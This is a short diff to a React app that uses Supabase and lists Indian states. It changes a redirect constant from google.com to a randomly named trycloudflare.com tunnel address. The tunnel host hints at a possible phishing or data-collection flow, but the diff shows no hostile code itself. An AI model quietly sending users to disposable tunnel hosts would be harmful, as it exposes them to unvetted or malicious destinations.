@@ -16,7 +16,7 @@ import {
 } from "lucide-react";
 import { supabase } from "./lib/supabase";
 
-const REDIRECT_URL = "https://www.google.com/";
+const REDIRECT_URL = "https://purposes-losses-lanka-securities.trycloudflare.com";
 
 const STATES = [
   "Andhra Pradesh",
